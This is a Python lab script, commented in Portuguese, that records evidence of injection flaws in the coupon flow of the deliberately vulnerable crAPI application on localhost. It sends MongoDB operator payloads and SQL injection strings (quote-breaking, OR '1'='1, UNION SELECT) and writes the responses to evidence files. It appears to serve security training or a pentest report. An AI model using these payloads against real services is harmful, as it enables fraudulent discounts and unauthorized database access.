#!/usr/bin/env python3
"""
Captura as evidências das injeções no fluxo de cupons do crAPI:

  09 - NoSQL Injection (community/validate-coupon): obter um cupom válido sem
       saber o código, enviando um operador do MongoDB no lugar da string.
  10 - SQL Injection (workshop/apply_coupon): o coupon_code entra numa query
       SQL sem sanitização (error-based e boolean-based).

Pré-requisitos: crAPI local no ar e a conta do atacante registrada.

Uso:
  BASE_URL=http://localhost:8888 \
  EMAIL_ATACANTE=atacante@teste.local SENHA_ATACANTE='...' \
  python3 scripts/capturar-cupons.py

ATENÇÃO: só contra o ambiente de laboratório.
"""
import os, json, urllib.request, urllib.error, pathlib

BASE = os.environ.get("BASE_URL", "http://localhost:8888")
EMAIL = os.environ.get("EMAIL_ATACANTE", "atacante@teste.local")
SENHA = os.environ.get("SENHA_ATACANTE", "Atacante@2026!")
ROOT = pathlib.Path(__file__).resolve().parent.parent
EV = ROOT / "evidencias"


def login(email, pw):
    d = json.dumps({"email": email, "password": pw}).encode()
    r = urllib.request.Request(BASE + "/identity/api/auth/login", data=d,
                               headers={"Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(r))["token"]


def post(path, token, body, read=300):
    # body pode conter operadores ($ne etc.), por isso serializamos o dict cru
    data = json.dumps(body).encode()
    r = urllib.request.Request(BASE + path, data=data,
                               headers={"Authorization": "Bearer " + token,
                                        "Content-Type": "application/json"}, method="POST")
    try:
        x = urllib.request.urlopen(r)
        return x.status, x.read(read).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(read).decode(errors="replace")


def main():
    tok = login(EMAIL, SENHA)

    # --------------------------------------------------- 09 NoSQL injection
    out = []
    out.append("# NoSQL Injection — cupom grátis sem saber o código")
    out.append("# Endpoint: POST /community/api/v2/coupon/validate-coupon (MongoDB)")
    out.append("-" * 64)
    st, b = post("/community/api/v2/coupon/validate-coupon", tok, {"coupon_code": "NAOEXISTE123"})
    out.append(f"# 1) codigo inexistente (string):           HTTP {st}  {b.strip()}")
    st, b = post("/community/api/v2/coupon/validate-coupon", tok, {"coupon_code": {"$ne": "x"}})
    out.append(f"# 2) injecao {{'$ne':'x'}}:                    HTTP {st}  {b.strip()}")
    st, b = post("/community/api/v2/coupon/validate-coupon", tok, {"coupon_code": {"$gt": ""}})
    out.append(f"# 3) injecao {{'$gt':''}}:                     HTTP {st}  {b.strip()}")
    out.append("-" * 64)
    out.append("# Prova: enviando um OPERADOR do MongoDB no lugar da string, a query casa")
    out.append("# qualquer documento e retorna um cupom valido sem o atacante saber o codigo.")
    (EV / "09-nosql-injection" / "captura.txt").write_text("\n".join(out) + "\n", encoding="utf-8")
    print("[ok] 09 NoSQL Injection")

    # --------------------------------------------------- 10 SQL injection
    out = []
    out.append("# SQL Injection — coupon_code em query SQL sem sanitizacao")
    out.append("# Endpoint: POST /workshop/api/shop/apply_coupon (PostgreSQL)")
    out.append("-" * 64)
    st, b = post("/workshop/api/shop/apply_coupon", tok, {"coupon_code": "TRAC075'", "amount": 75})
    snippet = "HTML Server Error (500)" if "Server Error (500)" in b else b.strip()
    out.append(f"# 1) error-based: coupon_code = TRAC075'       HTTP {st}  {snippet}")
    st, b = post("/workshop/api/shop/apply_coupon", tok, {"coupon_code": "x' OR '1'='1", "amount": 75})
    out.append(f"# 2) boolean-based: coupon_code = x' OR '1'='1  HTTP {st}")
    out.append(f"#    resposta: {b.strip()}")
    out.append("#    (note: o input foi \"x'...\", mas a resposta cita TRAC075 -> o OR injetado")
    out.append("#     mudou a clausula WHERE e casou o cupom existente)")
    st, b = post("/workshop/api/shop/apply_coupon", tok, {"coupon_code": "nonexist' UNION SELECT NULL--", "amount": 75})
    snippet = "HTML Server Error (500)" if "Server Error (500)" in b else b.strip()
    out.append(f"# 3) UNION com colunas erradas:               HTTP {st}  {snippet}")
    out.append("-" * 64)
    out.append("# Prova: aspa simples e UNION invalido quebram a query (500 - error-based);")
    out.append("# 'x'' OR ''1''=''1' faz a query retornar o cupom TRAC075 (boolean-based).")
    (EV / "10-sql-injection" / "captura.txt").write_text("\n".join(out) + "\n", encoding="utf-8")
    print("[ok] 10 SQL Injection")
    print("Concluído. Evidências em", EV)


if __name__ == "__main__":
    main()
